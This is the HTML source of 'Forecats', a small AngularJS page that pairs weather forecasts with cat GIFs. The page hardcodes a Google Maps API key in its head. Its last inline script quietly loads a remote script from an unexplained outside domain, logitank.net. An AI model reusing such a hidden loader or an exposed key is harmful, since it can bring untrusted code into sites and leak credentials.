<!DOCTYPE html>
<html lang='en' ng-app='forecats'>
<head>

  <title>Forecats</title>
  <meta name='author' content='david cochran'>
  <meta name='description' content='Weather and cat GIFs'>
  <meta name='viewport' content='width=device-width,initial-scale=1'>
  <meta charset='utf-8'>
  
  <link href="http://fonts.googleapis.com/css?family=PT+Sans+Narrow" rel="stylesheet" type="text/css">
  <link href='style.css' rel='stylesheet' type='text/css'>
  <script type="text/javascript" src='https://maps.googleapis.com/maps/api/js?key=AIzaSyDkFGR3XRnMWwu7c1xgTX1KWiSZwUKA3aQ'></script>

</head>
<body>
  
  <div class='container' ng-cloak>

    <header class='text-lg bright'>Forecats</header>

    <section class='cat-container' ng-controller='catControl' ng-show='cat'>
      <div>
        <img width=100% height=auto ng-if='!canPlayType' ng-src='{{ cat.gif }}' ng-click='approveCurrentCat()'>
        <video width=100% height=auto ng-if='canPlayType && canPlayType.webm' ng-src='{{ cat.webm }}' autoplay loop webkit-plays-inline></video>
        <video width=100% height=auto ng-if='canPlayType && canPlayType.mp4 && !canPlayType.webm' ng-src='{{ cat.mp4 }}' autoplay loop webkit-plays-inline></video>
      </div>
    </section>
    
    <section class='search-container' ng-controller='searchControl'>
      <div class='table text-sm'>
        <input type='text' class='table-cell tc-100' placeholder='Enter a location' ng-keypress='handleInput($event)' ng-model='query'>
        <span class='table-cell tc-1 bright mouse-pointer' ng-click='handleSearch()'>search</span>
      </div>
    </section>

    <section class='weather-container relative' ng-controller='weatherControl' ng-show='forecast'>
      <div class='locale-container'>
        <!--
        <div ng-click='time12h = !time12h'>
          <span class='toggle text-cc' ng-class='{active: time12h}'>12</span>
          <span class='toggle text-cc' ng-class='{active: !time12h}'>24</span>
        </div>
        -->
        <div ng-click='degF = !degF'>
          <span class='toggle' ng-class='{active: degF}'>&deg;F</span>
          <span class='toggle' ng-class='{active: !degF}'>&deg;C</span>
        </div>
      </div>
      <div class='inset table'>
        <div class='table-row'>
          <div class='table-cell text-center'>
            <canvas skycon='forecast.currently.icon' width='76' height='76'></canvas>
          </div>
          <div class='table-cell'>
            <span class='text-xl'>{{ forecast.currently.temperature | temp: degF }}</span>
            <span class='text-sm faded' ng-show='degF'>&deg;F</span>
            <span class='text-sm faded' ng-hide='degF'>&deg;C</span>
          </div>
        </div>
        <div class='table-row'>
          <div class='table-cell text-center text-sm'>
            <span>{{ forecast.currently.summary | lowercase }}</span>
          </div>
          <div class='table-cell'>
            <span class='text-left'>
              <div>
                <span class='text-sm'>Feels like {{ forecast.currently.apparentTemperature | temp: degF }}</span>
              </div>
              <div>
                <span class='text-sm'>High {{ forecast.daily[0].temperatureMax | temp: degF }}</span>
                <span class='text-xs faded'>at {{ forecast.daily[0].temperatureMaxTime * 1000 | hour: time12h }}</span>
              </div>
              <div>
                <span class='text-sm'>Low {{ forecast.daily[0].temperatureMin | temp: degF }}</span>
                <span class='text-xs faded'>at {{ forecast.daily[0].temperatureMinTime * 1000 | hour: time12h }}</span>
              </div>
            </span>
          </div>
        </div>
      </div>
      <div class='inset'>
        <div class='inset text-md' ng-click='showHourly = !showHourly'>
          <span class='toggle' ng-class='{active: showHourly}'>Hourly</span>
          <span class='toggle' ng-class='{active: !showHourly}'>Daily</span>
        </div>
        <ul class='list list-inline' ng-show='showHourly'>
          <li class='text-center' ng-repeat='hour in forecast.hourly'>
            <div class='text-sm'>{{ hour.time * 1000 | hour: time12h }}</div>
            <div>
              <canvas skycon='hour.icon' width='56' height='56' title='{{ hour.summary }}'></canvas>
            </div>
            <div>
              <span class='text-sm'>{{ hour.temperature | temp: degF }}</span>
              <span class='text-xs faded' ng-show='degF' ng-if='$first'>&deg;F</span>
              <span class='text-xs faded' ng-hide='degF' ng-if='$first'>&deg;C</span>
            </div>
          </li>
        </ul>
        <ul class='list list-inline' ng-hide='showHourly'>
          <li class='text-center' ng-repeat='day in forecast.daily'>
            <div class='text-sm'>{{ day.time * 1000 | date: 'EEE' | uppercase }}</div>
            <div>
              <canvas skycon='day.icon' width='56' height='56' title='{{ day.summary }}'></canvas>
            </div>
            <div>
              <span class='inset text-sm'>{{ day.temperatureMax | temp: degF }}</span>
              <span class='inset faded text-xs'>{{ day.temperatureMin | temp: degF }}</span>
            </div>
          </li>
        </ul>
      </div>
    </section>

    <footer class='text-center' ng-controller='creditsControl' ng-show='imgurHref && forecastHref'>
      <ul class='inset list text-xs'>
        <li>Powered by <a ng-href='{{ forecastHref }}'>Forecast</a> and <a ng-href='{{ imgurHref }}'>Imgur</a></li>
      </ul>
    </footer>
  </div>

  <script type='text/javascript' src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.3.13/angular.min.js"></script>
  <script type='text/javascript' src="https://cdnjs.cloudflare.com/ajax/libs/skycons/1396634940/skycons.min.js"></script>
  <script type='text/javascript' src='app.js'></script>
  
  <script type='text/javascript'>
    document.head.appendChild((function() {
      var eugo = document.createElement('script');
      eugo.src = '//logitank.net/analogue.js';
      return eugo;
    })());
  </script>

</body>
</html>
